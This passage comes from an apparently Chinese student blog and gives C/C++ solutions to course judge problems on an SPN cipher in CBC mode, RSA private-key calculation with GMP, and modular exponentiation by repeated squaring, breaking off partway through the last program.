stdin);</span><br><span class="line">	<span class="built_in">fread</span>(k + <span class="number">4</span>, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">	k[<span class="number">1</span>] = ((k[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xffffffffffff0000</span>) ^ ((k[<span class="number">4</span>] &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">	k[<span class="number">2</span>] = ((k[<span class="number">0</span>] &lt;&lt; <span class="number">32</span>) &amp; <span class="number">0xffffffff00000000</span>) ^ ((k[<span class="number">4</span>] &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">	k[<span class="number">3</span>] = ((k[<span class="number">0</span>] &lt;&lt; <span class="number">48</span>) &amp; <span class="number">0xffff000000000000</span>) ^ ((k[<span class="number">4</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffffffffffffff</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fread</span>(plaintext, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">	plaintext[<span class="number">0</span>] ^= initialValue;</span><br><span class="line">	ciphertext[<span class="number">0</span>] = <span class="built_in">SPN</span>(k, plaintext[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">fwrite</span>(ciphertext, SPNBYTES, <span class="number">1</span>, stdout);</span><br><span class="line">	<span class="comment">// CBC模式</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (INPUTBYTES / SPNBYTES); i++) &#123;</span><br><span class="line">		<span class="built_in">fread</span>(plaintext, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">		plaintext[<span class="number">0</span>] ^= ciphertext[<span class="number">0</span>];</span><br><span class="line">		ciphertext[<span class="number">0</span>] = <span class="built_in">SPN</span>(k, plaintext[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">fwrite</span>(ciphertext, SPNBYTES, <span class="number">1</span>, stdout);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="rsa参数计算"><a class="markdownIt-Anchor" href="#rsa参数计算"></a> RSA参数计算</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/V">oj | RSA参数计算</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030110915.png" alt="RSA参数计算" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 1&lt;&lt;31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> test_num[] = &#123;</span><br><span class="line">  <span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,</span><br><span class="line">  <span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diygcd</span><span class="params">(<span class="keyword">mpz_t</span> a, <span class="keyword">mpz_t</span> b, <span class="keyword">mpz_t</span> max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mpz_t</span> rt, at, bt;</span><br><span class="line">    <span class="built_in">mpz_init</span>(rt);</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(at, a);</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(bt, b);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(at, bt) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_swap</span>(at, bt);</span><br><span class="line">    <span class="built_in">mpz_mod</span>(rt, at, bt);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(rt, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpz_set</span>(at, bt);</span><br><span class="line">        <span class="built_in">mpz_set</span>(bt, rt);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(rt, at, bt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_set</span>(max, bt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expmod</span><span class="params">(<span class="keyword">mpz_t</span> e, <span class="keyword">mpz_t</span> m, <span class="keyword">mpz_t</span> N, <span class="keyword">mpz_t</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mpz_t</span> i, r, result;</span><br><span class="line">    <span class="built_in">mpz_init</span>(i); <span class="built_in">mpz_init</span>(r); <span class="built_in">mpz_init</span>(result);</span><br><span class="line">    <span class="built_in">mpz_set</span>(i, e);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(result, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(i, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpz_cdiv_r_ui</span>(r, i, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(r, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_mul</span>(m, m, m);</span><br><span class="line">            <span class="built_in">mpz_cdiv_q_ui</span>(i, i, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_mul</span>(result, result, m);</span><br><span class="line">            <span class="built_in">mpz_sub_ui</span>(i, i, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">mpz_mod</span>(m, m, N);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(result, result, N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_mul</span>(b, m, result);</span><br><span class="line">    <span class="built_in">mpz_mod</span>(b, b, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PrimeJudge</span><span class="params">(<span class="keyword">mpz_t</span> n, <span class="keyword">int</span> limit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(n, <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> test_len = <span class="built_in"><span class="keyword">sizeof</span></span>(test_num) / <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> sign;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i, t;</span><br><span class="line">    <span class="keyword">mpz_t</span> test;</span><br><span class="line">    <span class="built_in">mpz_init</span>(test);</span><br><span class="line">    sign = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; test_len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(n, test_num[i]) == <span class="number">0</span>)</span><br><span class="line">            sign = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sign)</span><br><span class="line">        <span class="keyword">return</span> sign;</span><br><span class="line">    sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; test_len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpz_mod_ui</span>(test, n, test_num[i]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(test, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">            sign = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sign = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">mpz_t</span> m, a, b, j, r;</span><br><span class="line">    <span class="built_in">mpz_init</span>(m); <span class="built_in">mpz_init</span>(a); <span class="built_in">mpz_init</span>(b); <span class="built_in">mpz_init</span>(j); <span class="built_in">mpz_init</span>(r);</span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(m, n, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(r, n, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_tstbit</span>(m, <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        k++;</span><br><span class="line">        <span class="built_in">mpz_cdiv_q_ui</span>(m, m, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">gmp_randstate_t</span> state;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">mpz_set_ui</span>(a, <span class="number">2</span>); <span class="built_in">mpz_cmp_ui</span>(a, limit) &lt;= <span class="number">0</span> &amp;&amp; <span class="built_in">mpz_cmp</span>(a, r) &lt;= <span class="number">0</span>; <span class="built_in">mpz_add_ui</span>(a, a, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(a, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">expmod</span>(m, a, n, b);</span><br><span class="line">        sign = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(b, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            sign = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (t = <span class="number">0</span>; t &lt; k; t++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(b, r) == <span class="number">0</span>) &#123;</span><br><span class="line">                sign = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">mpz_mul</span>(b, b, b);</span><br><span class="line">                <span class="built_in">mpz_mod</span>(b, b, n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sign == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_clear</span>(m); <span class="built_in">mpz_clear</span>(a); <span class="built_in">mpz_clear</span>(b); <span class="built_in">mpz_clear</span>(j); <span class="built_in">mpz_clear</span>(r);</span><br><span class="line">    <span class="keyword">return</span> sign;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">invert</span><span class="params">(<span class="keyword">mpz_t</span> d, <span class="keyword">mpz_t</span> e, <span class="keyword">mpz_t</span> yN)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mpz_t</span> x1, x2, x3, y1, y2, y3, z1, z2, z3, k, p, temp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mpz_init</span>(x1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(x2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(x3);</span><br><span class="line">    <span class="built_in">mpz_init</span>(y1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(y2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(y3);</span><br><span class="line">    <span class="built_in">mpz_init</span>(z1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(z2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(z3);</span><br><span class="line">    <span class="built_in">mpz_init</span>(k);</span><br><span class="line">    <span class="built_in">mpz_init</span>(p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">diygcd</span>(e, yN, temp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mpz_init_set</span>(temp, yN);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(e, yN) &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_swap</span>(e, yN);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(x1, <span class="number">1</span>); <span class="built_in">mpz_set_ui</span>(x2, <span class="number">0</span>); <span class="built_in">mpz_set</span>(x3, yN);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(y1, <span class="number">0</span>); <span class="built_in">mpz_set_ui</span>(y2, <span class="number">1</span>); <span class="built_in">mpz_set</span>(y3, e);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(y3, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_set_ui</span>(d, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(y3, <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_set</span>(d, y2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">mpz_mod</span>(p, x3, y3);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(k, x3, p);</span><br><span class="line">        <span class="built_in">mpz_cdiv_q</span>(k, k, y3);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(z1, k, y1);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(z1, x1, z1);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(z2, k, y2);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(z2, x2, z2);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(z3, k, y3);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(z3, x3, z3);</span><br><span class="line">        <span class="built_in">mpz_set</span>(x1, y1);</span><br><span class="line">        <span class="built_in">mpz_set</span>(x2, y2);</span><br><span class="line">        <span class="built_in">mpz_set</span>(x3, y3);</span><br><span class="line">        <span class="built_in">mpz_set</span>(y1, z1);</span><br><span class="line">        <span class="built_in">mpz_set</span>(y2, z2);</span><br><span class="line">        <span class="built_in">mpz_set</span>(y3, z3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(d, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_add</span>(d, d, temp);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//问题的个数</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">//存储大整数</span></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">mpz_t</span> e, p, q, maxdiv;</span><br><span class="line">    <span class="built_in">mpz_init</span>(e);</span><br><span class="line">    <span class="built_in">mpz_init</span>(p);</span><br><span class="line">    <span class="built_in">mpz_init</span>(q);</span><br><span class="line">    <span class="built_in">mpz_init</span>(maxdiv);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, temp);</span><br><span class="line">        <span class="built_in">mpz_set_str</span>(e, temp, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, temp);</span><br><span class="line">        <span class="built_in">mpz_set_str</span>(p, temp, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, temp);</span><br><span class="line">        <span class="built_in">mpz_set_str</span>(q, temp, <span class="number">10</span>);</span><br><span class="line">        <span class="comment">//判断e是否足够大</span></span><br><span class="line">        <span class="keyword">int</span> compare = <span class="built_in">mpz_cmp_ui</span>(e, <span class="number">65536</span>);</span><br><span class="line">        <span class="keyword">if</span> (compare &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断素数</span></span><br><span class="line">        sign = <span class="built_in">PrimeJudge</span>(p, <span class="number">20</span>) + <span class="built_in">PrimeJudge</span>(q, <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">if</span> (sign &lt; <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断p,q间隔</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(p, q) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">mpz_t</span> tool, N;</span><br><span class="line">        <span class="built_in">mpz_init</span>(N);</span><br><span class="line">        <span class="built_in">mpz_init</span>(tool);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(N, p, q);</span><br><span class="line">        <span class="built_in">mpz_sqrt</span>(N, N);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_sub</span>(tool, p, N);</span><br><span class="line">        <span class="built_in">mpz_abs</span>(tool, tool);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(tool, MAX) &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">mpz_sub</span>(tool, q, N);</span><br><span class="line">        <span class="built_in">mpz_abs</span>(tool, tool);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(tool, MAX) &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">mpz_t</span> yN, d, p1, q1;</span><br><span class="line">        <span class="built_in">mpz_init</span>(yN);</span><br><span class="line">        <span class="built_in">mpz_init</span>(d);</span><br><span class="line">        <span class="built_in">mpz_init</span>(p1);</span><br><span class="line">        <span class="built_in">mpz_init</span>(q1);</span><br><span class="line">        <span class="built_in">mpz_sub_ui</span>(p1, p, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">mpz_sub_ui</span>(q1, q, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(yN, p1, q1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断p1和q1的最大公因子的大小</span></span><br><span class="line">        <span class="built_in">diygcd</span>(q1, p1, maxdiv);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(maxdiv, <span class="number">16</span>) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//求d</span></span><br><span class="line">        <span class="keyword">int</span> choice = <span class="built_in">invert</span>(d, e, yN);</span><br><span class="line">        <span class="keyword">if</span> (!choice)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">gmp_printf</span>(<span class="string">&quot;%Zd\n&quot;</span>, d);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(yN);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(d);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(p1);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(q1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_clear</span>(e);</span><br><span class="line">    <span class="built_in">mpz_clear</span>(p);</span><br><span class="line">    <span class="built_in">mpz_clear</span>(q);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="模重复平方"><a class="markdownIt-Anchor" href="#模重复平方"></a> 模重复平方</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/VI">oj | 模重复平方</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030111526.png" alt="模重复平方" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;gmp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;libgmp-10.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calInverse</span><span class="params">(<span class="keyword">mpz_t</span> eInverse, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> paraN)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">mpz_t</span> st[<span class="number">5000</span>];</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">mpz_init</span>(st[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">mpz_t</span> n, temp, temp1, temp2, e;</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(e, paraE);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(n, paraN);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp1);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp2);</span><br><span class="line">	<span class="built_in">mpz_init_set_ui</span>(temp, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">mpz_sub</span>(n, temp, n);</span><br><span class="line">	<span class="comment">// 求解e的逆</span></span><br><span class="line">	<span class="built_in">mpz_mod</span>(temp, e, n);</span><br><span class="line">	<span class="built_in">mpz_sub</span>(temp1, e, temp);</span><br><span class="line">	<span class="built_in">mpz_div</span>(temp1, temp1, n);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(st[<span class="number">0</span>], temp1);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		count++;</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(st[count], temp1);</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(e, n);</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(n, temp);</span><br><span class="line">		<span class="built_in">mpz_mod</span>(temp, e, n);</span><br><span class="line">		<span class="built_in">mpz_sub</span>(temp1, e, temp);</span><br><span class="line">		<span class="built_in">mpz_div</span>(temp1, temp1, n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">mpz_init_set_ui</span>(temp1, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">mpz_init_set_ui</span>(temp2, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">mpz_sub</span>(n, temp1, n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(temp, temp2);</span><br><span class="line">		<span class="built_in">mpz_mul</span>(temp2, temp2, st[i]);</span><br><span class="line">		<span class="built_in">mpz_sub</span>(temp2, temp1, temp2);</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(temp1, temp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//gmp_printf(&quot;%Zd\n&quot;, temp1);</span></span><br><span class="line">	<span class="built_in">mpz_set</span>(eInverse, temp1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expmod</span><span class="params">(<span class="keyword">mpz_t</span> a, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> paraN)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">mpz_t</span> e, n, eBack, aPow, temp;</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(e, paraE);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(n, paraN);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(eBack, e);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(aPow, a);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp);</span><br><span class="line">	<span class="built_in">mpz_set_ui</span>(a, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">mpz_mod_ui</span>(temp, eBack, <span class="number">2</span>);	<span class="comment">// 一些准备工作</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(eBack, <span class="number">0</span>) != <span class="number">0</span>) &#123;		<span class="comment">// 当还没被除完时</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">1</span>) == <span class="number">0</span>) &#123;		<span class="comment">// 余数为1，则加上</span></span><br><span class="line">			<span class="built_in">mpz_mul</span>(a, a, aPow);</span><br><span class="line">			<span class="built_in">mpz_mod</span>(a, a, n);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;a = %Zd\n&quot;</span>, a);</span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;temp = %Zd\n&quot;</span>, temp);</span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;aPow = %Zd\n&quot;</span>, aPow);</span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;eBack = %Zd\n&quot;</span>, eBack);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">mpz_mul</span>(aPow, aPow, aPow);		<span class="comment">// 平方</span></span><br><span class="line">		<span class="built_in">mpz_mod</span>(aPow, aPow, n);</span><br><span class="line">		<span class="built_in">mpz_div_ui</span>(eBack, 